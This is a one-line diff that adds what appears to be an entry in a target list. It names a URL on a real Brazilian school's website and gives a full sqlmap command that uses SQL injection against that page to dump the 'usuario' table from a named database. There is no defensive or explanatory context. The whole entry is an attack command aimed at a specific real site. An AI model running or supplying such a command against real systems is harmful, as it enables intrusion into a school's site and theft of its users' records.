@@ -1,0 +1,1 @@
+http://colegiopegasus.com.br/noticias.php?noticia=19 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://colegiopegasus.com.br/noticias.php?noticia=19 -D dezoito80n_colpegasus -T usuario --dump
